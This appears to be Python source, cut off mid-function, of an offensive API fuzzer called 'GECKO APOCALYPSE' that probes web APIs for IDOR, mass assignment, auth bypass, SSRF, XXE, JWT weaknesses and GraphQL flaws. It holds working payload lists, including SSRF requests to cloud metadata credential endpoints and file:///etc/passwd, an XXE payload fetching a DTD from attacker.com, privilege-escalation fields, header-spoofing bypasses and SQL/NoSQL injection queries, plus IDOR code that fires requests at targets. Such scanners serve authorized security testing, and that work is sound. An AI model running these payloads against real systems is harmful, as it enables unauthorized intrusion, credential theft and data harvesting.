"""
GECKO APOCALYPSE - API Fuzzer v3.0
Advanced API Security Testing Module
Targets: BOLA/IDOR, Mass Assignment, Rate Limiting, Versioning, Data Exposure,
         Auth Bypass, Parameter Pollution, GraphQL, Pagination Abuse, File Upload APIs,
         Method Override, CORS Misconfig, Content Negotiation, Batch Operations,
         UUID/GUID IDOR, Nested Object Injection, Array Manipulation, Metadata Leakage,
         Cache Poisoning, Host Header Auth Bypass, JSONP, Open Redirect, SSRF, XXE,
         Reflection, Debug Endpoints, JWT Analysis, API Key Leakage, HPP, CBOR/MsgPack
"""

import asyncio
import base64
import hashlib
import json
import logging
import random
import re
import string
import struct
import time
import uuid
from dataclasses import asdict, dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple, Union
from urllib.parse import parse_qs, unquote, urlencode, urljoin, urlparse

import aiohttp
import jwt
from jwt.exceptions import DecodeError, InvalidTokenError

logger = logging.getLogger(__name__)


class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class VulnType(Enum):
    BOLA_IDOR = "BOLA/IDOR Vulnerability"
    MASS_ASSIGNMENT = "Mass Assignment"
    RATE_LIMIT_MISSING = "API No Rate Limiting"
    RATE_LIMIT_WEAK = "Weak Rate Limiting"
    RATE_LIMIT_BYPASS = "Rate Limit Bypass"
    VERSION_BYPASS = "API Version Bypass"
    DATA_EXPOSURE = "Excessive Data Exposure"
    HTTP_METHOD_ENUM = "HTTP Method Enumeration"
    AUTH_BYPASS = "Authentication Bypass"
    PARAMETER_POLLUTION = "HTTP Parameter Pollution"
    GRAPHQL_INTROSPECTION = "GraphQL Introspection Enabled"
    GRAPHQL_BYPASS = "GraphQL Authorization Bypass"
    GRAPHQL_DOS = "GraphQL Denial of Service"
    PAGINATION_ABUSE = "Pagination Abuse / Data Harvesting"
    FILE_UPLOAD_API = "Unrestricted File Upload via API"
    METHOD_OVERRIDE = "HTTP Method Override"
    CORS_API_MISCONFIG = "CORS Misconfiguration on API"
    CONTENT_NEGOTIATION = "Content Negotiation Bypass"
    BATCH_ABUSE = "Batch Operation Abuse"
    UUID_IDOR = "UUID/GUID-based IDOR"
    NESTED_INJECTION = "Nested Object Injection"
    ARRAY_MANIPULATION = "Array Manipulation"
    METADATA_LEAK = "API Metadata Leakage"
    CACHE_POISONING = "Web Cache Poisoning via API"
    HOST_HEADER_AUTH_BYPASS = "Host Header Authentication Bypass"
    JSONP_ENABLED = "JSONP Endpoint Enabled"
    OPEN_REDIRECT_API = "Open Redirect via API"
    SSRF_API = "Server-Side Request Forgery via API"
    XML_EXTERNAL_ENTITY = "XXE via API"
    REFLECTION_API = "Sensitive Reflection in API"
    DEBUG_ENDPOINT = "Debug/Admin API Endpoint Exposed"
    JWT_WEAK = "Weak JWT Implementation"
    JWT_NONE_ALG = "JWT None Algorithm Bypass"
    JWT_KEY_CONFUSION = "JWT Key Confusion Attack"
    API_KEY_EXPOSURE = "API Key Exposure in Response"
    HPP_JSON = "HTTP Parameter Pollution in JSON"
    CBOR_INJECTION = "CBOR/MsgPack Injection"
    GRAPHQL_SQLI = "GraphQL SQL Injection"
    API_VERSION_DISCOVERY = "API Version Discovery"
    OPENAPI_LEAK = "OpenAPI/Swagger Specification Leak"
    HEALTH_CHECK_LEAK = "Health Check Endpoint Information Leak"
    METRICS_EXPOSURE = "Prometheus/Metrics Endpoint Exposed"
    DOC_API_EXPOSURE = "API Documentation Exposure"


@dataclass
class Finding:
    vuln_type: VulnType
    severity: Severity
    url: str
    evidence: str
    remediation: str
    cwe: str
    owasp: str
    payload: Optional[str] = None
    confidence: str = "MEDIUM"
    tags: List[str] = field(default_factory=list)
    raw_response: Optional[str] = None
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "type": self.vuln_type.value,
            "severity": self.severity.value,
            "url": self.url,
            "payload": self.payload,
            "evidence": self.evidence,
            "remediation": self.remediation,
            "cwe": self.cwe,
            "owasp": self.owasp,
            "confidence": self.confidence,
            "tags": self.tags,
            "timestamp": self.timestamp,
        }


class APIFuzzer:
    def __init__(self, session: aiohttp.ClientSession, config: Dict, db: Any):
        self.session = session
        self.config = config
        self.db = db
        self.findings_cache: Set[str] = set()
        self.rate_limit_cache: Dict[str, Dict] = {}
        self.discovered_endpoints: Set[str] = set()
        self.discovered_fields: Set[str] = set()
        self.baseline_responses: Dict[str, Any] = {}

        # Comprehensive test configurations
        self.mass_assign_fields = self._load_mass_assign_fields()
        self.id_patterns = self._load_id_patterns()
        self.sensitive_patterns = self._load_sensitive_patterns()
        self.auth_bypass_headers = self._load_auth_bypass_headers()
        self.api_version_patterns = self._load_version_patterns()
        self.content_types = self._load_content_types()
        self.method_override_headers = self._load_method_override_headers()
        self.graphql_payloads = self._load_graphql_payloads()
        self.ssrf_payloads = self._load_ssrf_payloads()
        self.xxe_payloads = self._load_xxe_payloads()
        self.jwt_secrets = self._load_jwt_secrets()
        self.openapi_paths = self._load_openapi_paths()
        self.health_paths = self._load_health_paths()
        self.debug_paths = self._load_debug_paths()

        # Rate limiting config
        self.rate_limit_requests = config.get("rate_limit_requests", 30)
        self.rate_limit_window = config.get("rate_limit_window", 10)
        self.max_concurrent = config.get("max_concurrent", 10)

        # Semaphore for controlled concurrency
        self.semaphore = asyncio.Semaphore(self.max_concurrent)

    # ─── Configuration Loaders ─────────────────────────────────────────────

    def _load_mass_assign_fields(self) -> Dict[str, Any]:
        return {
            # Role/Privilege escalation
            "is_admin": True,
            "isAdmin": True,
            "admin": True,
            "role": "admin",
            "roles": ["admin"],
            "privilege": "admin",
            "privileges": ["admin"],
            "is_superuser": True,
            "is_staff": True,
            "is_moderator": True,
            "access_level": "admin",
            "user_type": "admin",
            "account_type": "premium",
            "membership": "gold",
            "tier": "enterprise",
            "plan": "unlimited",
            "userRole": "admin",
            "user_role": "admin",
            "accountRole": "admin",
            # Account status
            "verified": True,
            "is_verified": True,
            "active": True,
            "status": "active",
            "enabled": True,
            "disabled": False,
            "banned": False,
            "suspended": False,
            "deleted": False,
            "archived": False,
            "locked": False,
            # Financial
            "balance": 99999,
            "credits": 99999,
            "points": 99999,
            "wallet": 99999,
            "amount": 99999,
            "price": 0.01,
            "discount": 100,
            "coupon": "FREE100",
            "currency": "USD",
            "payment_status": "paid",
            "billing_cycle": "lifetime",
            "total": -1,
            "subtotal": 0,
            "tax": 0,
            "fee": 0,
            # Feature flags
            "premium": True,
            "pro": True,
            "enterprise": True,
            "subscribed": True,
            "trial": False,
            "expired": False,
            "limited": False,
            "beta": True,
            "feature_flags": {"unlimited": True, "admin": True},
            # Profile/PII manipulation
            "email_verified": True,
            "phone_verified": True,
            "kyc_verified": True,
            "two_factor_enabled": False,
            "mfa_enabled": False,
            "otp_required": False,
            "identity_verified": True,
            "background_check": "passed",
            # Nested object injection
            "user": {"role": "admin", "is_admin": True, "permissions": ["all"]},
            "account": {"type": "premium", "balance": 99999, "status": "active"},
            "profile": {"verified": True, "tier": "enterprise", "admin": True},
            "settings": {"admin_mode": True, "debug": True, "superuser": True},
            "metadata": {"is_internal": True, "source": "admin_panel", "trusted": True},
            "config": {"admin": True, "debug_mode": True, "maintenance": False},
            "preferences": {"role": "admin", "access": "unrestricted"},
            # Array manipulation
            "permissions": ["admin", "superuser", "all", "*"],
            "scopes": ["read", "write", "delete", "admin", "*"],
            "groups": ["administrators", "sudo", "wheel", "domain admins"],
            "tags": ["internal", "trusted", "system", "admin"],
            "roles": [{"name": "admin", "permissions": ["*"]}],
            # Type confusion
            "id": "1",
            "user_id": "1",
            "owner_id": "1",
            "created_at": "2099-01-01",
            "updated_at": "2099-01-01",
            "version": 99999,
            "_version": 99999,
            "__v": 99999,
        }

    def _load_id_patterns(self) -> List[Dict]:
        return [
            {
                "pattern": r"/(\d+)(?:/|$|\?)",
                "type": "numeric",
                "generator": self._gen_numeric_ids,
            },
            {
                "pattern": r"/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:/|$|\?)",
                "type": "uuid",
                "generator": self._gen_uuid_variants,
            },
            {
                "pattern": r"/([0-9a-f]{24})(?:/|$|\?)",
                "type": "mongodb",
                "generator": self._gen_mongodb_variants,
            },
            {
                "pattern": r"/([A-Za-z0-9]{20,32})(?:/|$|\?)",
                "type": "hash",
                "generator": self._gen_hash_variants,
            },
            {
                "pattern": r"/([A-Za-z0-9_-]{10,30})(?:/|$|\?)",
                "type": "slug",
                "generator": self._gen_slug_variants,
            },
            {
                "pattern": r"[?&](?:id|user_id|account_id|order_id|product_id|item_id|doc_id|file_id)=([^&]+)",
                "type": "param",
                "generator": self._gen_param_variants,
            },
            {
                "pattern": r"/(me|self|current|profile|account)(?:/|$|\?)",
                "type": "self_ref",
                "generator": self._gen_self_ref_variants,
            },
        ]

    def _load_sensitive_patterns(self) -> List[Dict]:
        return [
            {
                "pattern": r"(?i)(password|passwd|pwd)\s*[:=]\s*[\"']?[^\"'\s]{4,}",
                "type": "password",
                "severity": Severity.CRITICAL,
            },
            {
                "pattern": r"(?i)(api[_-]?key|apikey|secret[_-]?key)\s*[:=]\s*[\"']?[a-zA-Z0-9]{16,}",
                "type": "api_key",
                "severity": Severity.CRITICAL,
            },
            {
                "pattern": r"(?i)(access[_-]?token|auth[_-]?token|jwt|bearer)\s*[:=]\s*[\"']?[a-zA-Z0-9_\-\.]{20,}",
                "type": "token",
                "severity": Severity.CRITICAL,
            },
            {
                "pattern": r"(?i)(private[_-]?key|ssh[_-]?key|rsa[_-]?key)\s*[:=]\s*[\"']?-----BEGIN",
                "type": "private_key",
                "severity": Severity.CRITICAL,
            },
            {
                "pattern": r"\b\d{3}-\d{2}-\d{4}\b",
                "type": "ssn",
                "severity": Severity.CRITICAL,
            },
            {
                "pattern": r"\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b",
                "type": "credit_card",
                "severity": Severity.CRITICAL,
            },
            {
                "pattern": r"(?i)(aws[_-]?access[_-]?key[_-]?id)\s*[:=]\s*[\"']?AKIA[0-9A-Z]{16}",
                "type": "aws_key",
                "severity": Severity.CRITICAL,
            },
            {
                "pattern": r"(?i)(github[_-]?token|ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36})",
                "type": "github_token",
                "severity": Severity.CRITICAL,
            },
            {
                "pattern": r"(?i)(slack[_-]?token|xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*)",
                "type": "slack_token",
                "severity": Severity.CRITICAL,
            },
            {
                "pattern": r"(?i)(stripe[_-]?key|sk_live_[a-zA-Z0-9]{24,})",
                "type": "stripe_key",
                "severity": Severity.CRITICAL,
            },
            {
                "pattern": r"(?i)(sendgrid[_-]?key|SG\.[a-zA-Z0-9]{22}\.[a-zA-Z0-9]{43})",
                "type": "sendgrid_key",
                "severity": Severity.CRITICAL,
            },
            {
                "pattern": r"(?i)(database[_-]?url|db[_-]?connection)\s*[:=]\s*[\"']?[\w\+]+://",
                "type": "db_url",
                "severity": Severity.HIGH,
            },
            {
                "pattern": r"(?i)(internal|staging|dev|test|localhost|127\.0\.0\.1|0\.0\.0\.0)",
                "type": "internal_ref",
                "severity": Severity.MEDIUM,
            },
            {
                "pattern": r"(?i)(email|mail)\s*[:=]\s*[\"']?[\w\.-]+@[\w\.-]+\.\w+",
                "type": "email",
                "severity": Severity.MEDIUM,
            },
            {
                "pattern": r"(?i)(phone|mobile|tel)\s*[:=]\s*[\"']?\+?\d[\d\s-]{8,}",
                "type": "phone",
                "severity": Severity.MEDIUM,
            },
            {
                "pattern": r"(?i)(ip[_-]?address|client[_-]?ip)\s*[:=]\s*[\"']?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",
                "type": "ip",
                "severity": Severity.LOW,
            },
            {
                "pattern": r"(?i)(social[_-]?security|ssn|national[_-]?id)\s*[:=]\s*[\"']?\d{3}-?\d{2}-?\d{4}",
                "type": "national_id",
                "severity": Severity.CRITICAL,
            },
            {
                "pattern": r"(?i)(dob|birth[_-]?date|date[_-]?of[_-]?birth)\s*[:=]\s*[\"']?\d{2}[/-]\d{2}[/-]\d{4}",
                "type": "dob",
                "severity": Severity.HIGH,
            },
        ]

    def _load_auth_bypass_headers(self) -> List[Dict[str, str]]:
        return [
            {"X-Original-URL": ""},
            {"X-Rewrite-URL": ""},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Forwarded-Proto": "https"},
            {"X-HTTP-Host-Override": "localhost"},
            {"Forwarded": "for=127.0.0.1"},
            {"X-ProxyUser-Ip": "127.0.0.1"},
            {"X-Custom-Authorization": "admin"},
            {"X-Authorization": "Bearer admin"},
            {"Authorization": "Bearer null"},
            {"Authorization": "Bearer undefined"},
            {"X-Api-Version": "admin"},
            {"X-Admin": "true"},
            {"X-Debug": "true"},
            {"X-Internal": "true"},
            {"X-Request-Source": "internal"},
            {"X-Environment": "production"},
            {"X-Original-Method": "GET"},
            {"X-HTTP-Method-Override": "GET"},
            {"X-Authenticated-User": "admin"},
            {"X-User-Id": "1"},
            {"X-User-Role": "admin"},
            {"X-Account-Type": "premium"},
            {"X-Is-Admin": "true"},
            {"CF-Connecting-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"X-Cluster-Client-IP": "127.0.0.1"},
            {"X-Forwarded-Server": "localhost"},
            {"X-Forwarded-Scheme": "https"},
            {"Front-End-Https": "on"},
        ]

    def _load_version_patterns(self) -> List[str]:
        return [
            "/v1/",
            "/v2/",
            "/v3/",
            "/v4/",
            "/v5/",
            "/v0/",
            "/v0.1/",
            "/v0.9/",
            "/api/v1/",
            "/api/v2/",
            "/api/v3/",
            "/api/internal/",
            "/api/admin/",
            "/api/debug/",
            "/api/test/",
            "/api/staging/",
            "/api/beta/",
            "/api/alpha/",
            "/api/private/",
            "/api/secure/",
            "/api/management/",
            "/api/system/",
            "/api/legacy/",
            "/api/deprecated/",
            "/api/sandbox/",
            "/api/dev/",
            "/rest/v1/",
            "/rest/v2/",
            "/graphql/v1/",
            "/graphql/v2/",
            "/svc/v1/",
            "/service/v1/",
            "/gateway/v1/",
            "/edge/v1/",
            "/public/v1/",
            "/partner/v1/",
            "/mobile/v1/",
            "/web/v1/",
        ]

    def _load_content_types(self) -> List[str]:
        return [
            "application/json",
            "application/xml",
            "text/xml",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/plain",
            "application/octet-stream",
            "application/vnd.api+json",
            "application/hal+json",
            "application/ld+json",
            "application/graphql",
            "application/x-ndjson",
            "text/csv",
            "text/html",
            "application/x-msgpack",
            "application/cbor",
            "application/x-www-form-urlencoded",
            "application/json-seq",
            "application/problem+json",
            "application/scim+json",
        ]

    def _load_method_override_headers(self) -> List[Dict[str, str]]:
        return [
            {"X-HTTP-Method-Override": "PUT"},
            {"X-HTTP-Method-Override": "DELETE"},
            {"X-HTTP-Method": "PUT"},
            {"X-HTTP-Method": "DELETE"},
            {"X-Method-Override": "PUT"},
            {"X-Method-Override": "DELETE"},
            {"_method": "PUT"},
            {"_method": "DELETE"},
            {"X-Original-Method": "PUT"},
            {"X-Original-Method": "DELETE"},
        ]

    def _load_graphql_payloads(self) -> Dict[str, str]:
        return {
            "introspection": '{"query":"query IntrospectionQuery { __schema { types { name fields { name type { name } } } } }"}',
            "introspection_full": '{"query":"query { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}',
            "mutation_bypass": '{"query":"mutation { login(input: {username: \\"admin\\", password: \\"admin\\"}) { token } }"}',
            "alias_attack": '{"query":"query { a1: users { id } a2: users { id } a3: users { id } a4: users { id } a5: users { id } a6: users { id } a7: users { id } a8: users { id } a9: users { id } a10: users { id } }"}',
            "deep_recursion": '{"query":"query { user { friend { friend { friend { friend { friend { friend { friend { friend { friend { name } } } } } } } } } } }"}',
            "fragment_spread": '{"query":"query { ...F1 } fragment F1 on Query { ...F2 } fragment F2 on Query { ...F3 } fragment F3 on Query { users { id } }"}',
            "batch_query": '[{"query":"query { users { id } }"},{"query":"query { users { id } }"},{"query":"query { users { id } }"}]',
            "field_suggestion": '{"query":"query { userr { id } }"}',
            "sql_injection": '{"query":"query { users(filter: \\"1 OR 1=1\\") { id name } }"}',
            "nosql_injection": '{"query":"query { users(filter: {username: {$ne: null}}) { id name } }"}',
            "bypass_auth": '{"query":"query { adminUsers { id email role } }"}',
            "subscription_dos": '{"query":"subscription { messageCreated { id content } }"}',
        }

    def _load_ssrf_payloads(self) -> List[str]:
        return [
            "http://127.0.0.1:22",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:3000",
            "http://127.0.0.1:5000",
            "http://localhost:22",
            "http://localhost:80",
            "http://0.0.0.0:80",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/metadata/v1/",
            "http://metadata.google.internal/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://100.100.100.200/latest/meta-data/",
            "http://192.0.0.192/latest/",
            "file:///etc/passwd",
            "file:///C:/windows/win.ini",
            "file:///proc/self/environ",
            "dict://127.0.0.1:11211/",
            "gopher://127.0.0.1:9000/",
            "ftp://127.0.0.1:21/",
            "http://[::1]:80/",
            "http://[::]:80/",
            "http://0177.0.0.1/",
            "http://2130706433/",
            "http://3232235521/",
        ]

    def _load_xxe_payloads(self) -> List[str]:
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]><foo></foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>',
        ]

    def _load_jwt_secrets(self) -> List[str]:
        return [
            "secret",
            "secret123",
            "jwt-secret",
            "jwt_secret",
            "jwtsecret",
            "password",
            "123456",
            "admin",
            "key",
            "token",
            "auth",
            "your-256-bit-secret",
            "mysecret",
            "supersecret",
            "changeme",
            "default",
            "test",
            "testing",
            "dev",
            "development",
            "HS256",
            "HS512",
            "RS256",
            "public",
            "private",
        ]

    def _load_openapi_paths(self) -> List[str]:
        return [
            "/swagger.json",
            "/swagger.yaml",
            "/swagger.yml",
            "/api-docs",
            "/api/docs",
            "/api/swagger.json",
            "/openapi.json",
            "/openapi.yaml",
            "/openapi.yml",
            "/v2/api-docs",
            "/v3/api-docs",
            "/api/v1/docs",
            "/api/v2/docs",
            "/api/v3/docs",
            "/docs",
            "/swagger-ui.html",
            "/swagger-ui/",
            "/swagger/",
            "/api/swagger-ui.html",
            "/api/swagger-ui/",
            "/explorer",
            "/api/explorer",
            "/graphiql",
        ]

    def _load_health_paths(self) -> List[str]:
        return [
            "/health",
            "/healthz",
            "/healthcheck",
            "/health-check",
            "/ready",
            "/readyz",
            "/live",
            "/livez",
            "/status",
            "/api/health",
            "/api/status",
            "/actuator/health",
            "/actuator/info",
            "/actuator",
            "/metrics",
            "/prometheus",
            "/debug/vars",
            "/.well-known/health",
            "/_health",
            "/_status",
        ]

    def _load_debug_paths(self) -> List[str]:
        return [
            "/debug",
            "/api/debug",
            "/api/admin",
            "/admin",
            "/api/test",
            "/test",
            "/api/internal",
            "/internal",
            "/api/system",
            "/system",
            "/api/management",
            "/management",
            "/api/config",
            "/config",
            "/api/settings",
            "/settings",
            "/api/env",
            "/env",
            "/api/environment",
            "/environment",
            "/api/vars",
            "/vars",
            "/api/secrets",
            "/secrets",
            "/api/backup",
            "/backup",
            "/api/dump",
            "/dump",
            "/api/logs",
            "/logs",
            "/api/trace",
            "/trace",
            "/api/profiler",
            "/profiler",
            "/api/phpinfo",
            "/phpinfo",
            "/api/whoami",
            "/whoami",
            "/api/userinfo",
            "/userinfo",
        ]

    # ─── ID Generators ───────────────────────────────────────────────────────

    def _gen_numeric_ids(self, original: str) -> List[str]:
        oid = int(original)
        return [
            str(oid + 1),
            str(oid - 1),
            "1",
            "0",
            "-1",
            "999999",
            "999999999",
            str(oid + 100),
            str(oid - 100),
            "2147483647",
            "-2147483648",
            "4294967295",
            "-4294967296",
            str(oid * 2),
            str(oid // 2),
        ]

    def _gen_uuid_variants(self, original: str) -> List[str]:
        return [
            str(uuid.uuid4()),
            str(uuid.uuid4()),
            "00000000-0000-0000-0000-000000000000",
            "11111111-1111-1111-1111-111111111111",
            "ffffffff-ffff-ffff-ffff-ffffffffffff",
            "00000000-0000-0000-0000-000000000001",
        ]

    def _gen_mongodb_variants(self, original: str) -> List[str]:
        return [
            "0" * 24,
            "1" * 24,
            "f" * 24,
            "000000000000000000000001",
            "000000000000000000000002",
            "ffffffffffffffffffffffff",
            "eeeeeeeeeeeeeeeeeeeeeeee",
        ]

    def _gen_hash_variants(self, original: str) -> List[str]:
        return [
            hashlib.md5(b"1").hexdigest(),
            hashlib.md5(b"admin").hexdigest(),
            hashlib.sha1(b"1").hexdigest(),
            hashlib.sha256(b"1").hexdigest()[:32],
            "0" * len(original),
            "1" * len(original),
            "f" * len(original),
        ]

    def _gen_slug_variants(self, original: str) -> List[str]:
        return [
            "admin",
            "root",
            "test",
            "demo",
            "public",
            "private",
            "internal",
            "staging",
            "production",
            "backup",
            "default",
            "system",
            "api",
            "me",
            "self",
            "current",
            "profile",
            "account",
            "user",
        ]

    def _gen_param_variants(self, original: str) -> List[str]:
        variants = ["1", "2", "0", "-1", "true", "false", "null", "undefined", "admin"]
        if original.isdigit():
            variants.extend([str(int(original) + 1), str(int(original) - 1), "999999"])
        return variants

    def _gen_self_ref_variants(self, original: str) -> List[str]:
        return ["1", "admin", "root", "system", "0", "-1"]

    # ─── Core Scanning Logic ─────────────────────────────────────────────────

    async def scan(
        self, url: str, content: str, headers: Dict, response: aiohttp.ClientResponse
    ) -> List[Dict]:
        findings = []
        if not self._is_api(url, headers, content):
            return findings

        # Establish baseline for comparison
        await self._establish_baseline(url, headers)

        # Collect all scan tasks
        tasks = [
            self._bola_advanced(url, content, headers),
            self._mass_assign_advanced(url, content, headers),
            self._rate_limit_advanced(url, content, headers),
            self._version_bypass_advanced(url, content, headers),
            self._data_exposure_advanced(url, content, headers, response),
            self._method_enum_advanced(url, content, headers),
            self._auth_bypass_headers(url, content, headers),
            self._parameter_pollution(url, content, headers),
            self._graphql_advanced(url, content, headers),
            self._pagination_abuse(url, content, headers),
            self._file_upload_api(url, content, headers),
            self._method_override(url, content, headers),
            self._cors_api_misconfig(url, content, headers),
            self._content_negotiation_bypass(url, content, headers),
            self._batch_operation_abuse(url, content, headers),
            self._metadata_leakage(url, content, headers),
            self._cache_poisoning_api(url, content, headers),
            self._host_header_auth_bypass(url, content, headers),
            self._jsonp_detection(url, content, headers),
            self._ssrf_via_api(url, content, headers),
            self._xxe_via_api(url, content, headers),
            self._reflection_detection(url, content, headers),
            self._debug_endpoint_probe(url, content, headers),
            self._jwt_analysis(url, content, headers),
            self._api_key_exposure(url, content, headers),
            self._openapi_discovery(url, content, headers),
            self._health_endpoint_probe(url, content, headers),
            self._cbor_msgpack_injection(url, content, headers),
        ]

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, Exception):
                logger.error(f"Scan task failed: {result}")
                continue
            if result:
                if isinstance(result, list):
                    for finding in result:
                        findings.append(
                            finding.to_dict()
                            if isinstance(finding, Finding)
                            else finding
                        )
                elif isinstance(result, Finding):
                    findings.append(result.to_dict())
                else:
                    findings.append(result)

        # Deduplicate findings
        return self._deduplicate_findings(findings)

    def _is_api(self, url: str, headers: Dict, content: str) -> bool:
        url_lower = url.lower()
        content_type = headers.get("content-type", "").lower()

        api_indicators = [
            "/api/" in url_lower,
            any(f"/v{i}/" in url_lower for i in range(10)),
            "application/json" in content_type,
            "application/vnd.api+json" in content_type,
            "application/graphql" in content_type,
            "application/x-ndjson" in content_type,
            "graphql" in url_lower,
            "/rest/" in url_lower,
            "/graphql" in url_lower,
            "/svc/" in url_lower,
            "/gateway/" in url_lower,
            "/swagger" in url_lower,
            "/openapi" in url_lower,
            content.strip().startswith("{") or content.strip().startswith("["),
            "authorization" in headers,
            "x-api-key" in headers,
            "x-request-id" in headers,
            "accept" in headers and "json" in headers.get("accept", "").lower(),
        ]
        return any(api_indicators)

    async def _establish_baseline(self, url: str, headers: Dict):
        """Establish baseline response for comparison."""
        try:
            async with self.session.get(
                url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)
            ) as r:
                body = await r.text(errors="ignore")
                self.baseline_responses[url] = {
                    "status": r.status,
                    "length": len(body),
                    "headers": dict(r.headers),
                }
        except Exception as e:
            logger.debug(f"Baseline establishment failed: {e}")

    def _deduplicate_findings(self, findings: List[Dict]) -> List[Dict]:
        unique = []
        seen = set()
        for f in findings:
            key = f"{f.get('type')}:{f.get('url')}:{f.get('payload')}"
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique

    def _add_finding(self, finding: Finding) -> Optional[Finding]:
        key = f"{finding.vuln_type.value}:{finding.url}:{finding.payload}"
        if key in self.findings_cache:
            return None
        self.findings_cache.add(key)
        return finding

    async def _safe_request(
        self, method: str, url: str, **kwargs
    ) -> Optional[aiohttp.ClientResponse]:
        """Thread-safe request with semaphore."""
        async with self.semaphore:
            try:
                async with self.session.request(method, url, **kwargs) as r:
                    return r
            except Exception as e:
                logger.debug(f"Request failed: {e}")
                return None

    # ─── Advanced BOLA/IDOR ──────────────────────────────────────────────────

    async def _bola_advanced(
        self, url: str, content: str, headers: Dict
    ) -> List[Finding]:
        findings = []

        for id_pattern in self.id_patterns:
            matches = re.findall(id_pattern["pattern"], url)
            for match in matches:
                variants = id_pattern["generator"](match)
                for variant in variants:
                    test_url = url.replace(f"/{match}", f"/{variant}", 1)
                    try:
                        async with self.session.get(
                            test_url,
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=10),
                            allow_redirects=False,
                        ) as r:
                            if r.status == 200:
                                body = await r.text(errors="ignore")
                                baseline = self.baseline_responses.get(url, {})
                                baseline_len = baseline.get("length", 0)

                                # Check if response is structurally similar (not an error page)
                                if (
                                    len(body) > 100
                                    and "error" not in body.lower()[:200]
                                ):
                                    # Check for significant size difference from baseline
                                    size_diff = abs(len(body) - baseline_len)
                                    confidence = (
                                        "HIGH"
                                        if size_diff < baseline_len * 0.3
                                        else "MEDIUM"
                                    )

                                    finding = self._add_finding(
                                        Finding(
                                            vuln_type=(
                                                VulnType.BOLA_IDOR
                                                if id_pattern["type"] == "numeric"
                                                else VulnType.UUID_IDOR
                                            ),
                                            severity=Severity.CRITICAL,
                                            url=url,
                                            payload=f"ID type: {id_pattern['type']}, Original: {match}, Tested: {variant}",
                                            evidence=f"Successfully accessed resource with ID variant. Response size: {len(body)} bytes (baseline: {baseline_len})",
                                            remediation="Implement object-level authorization checks. Verify user ownership of resources. Use UUIDs with proper access control.",
                                            cwe="CWE-639",
                                            owasp="API1:2023",
                                            confidence=confidence,
                                            tags=[
                                                "bola",
                                                "idor",
                                                id_pattern["type"],
                                                "authorization",
                                            ],
                                        )
                                    )
                                    if finding:
                                        findings.append(finding)
                                    break
                    except Exception as e:
                        logger.debug(f"BOLA test failed: {e}")

        # Parameter-based IDOR
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param, values in params.items():
            if any(
                k in param.lower()
                for k in [
                    "id",
                    "user",
                    "account",
                    "order",
                    "product",
                    "item",
                    "doc",
                    "file",
                ]
            ):
                for value in values:
                    variants = self._gen_param_variants(value)
                    for variant in variants:
                        new_params = params.copy()
                        new_params[param] = [variant]
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                        try:
                            async with self.session.get(
                                test_url,
                                headers=headers,
                                timeout=aiohttp.ClientTimeout(total=10),
                            ) as r:
                                if r.status == 200:
                                    body = await r.text(errors="ignore")
                                    if len(body) > 100:
                                        finding = self._add_finding(
                                            Finding(
                                                vuln_type=VulnType.BOLA_IDOR,
                                                severity=Severity.CRITICAL,
                                                url=url,
                                                payload=f"Param: {param}={variant}",
                                                evidence=f"Parameter-based IDOR successful. Response: {len(body)} bytes",
                                                remediation="Validate user authorization for all parameter-based resource access",
                                                cwe="CWE-639",
                                                owasp="API1:2023",
                                                confidence="HIGH",
                                                tags=["idor", "parameter", param],
                                            )
                                        )
                                        if finding:
                                            findings.append(finding)
                        except Exception as e:
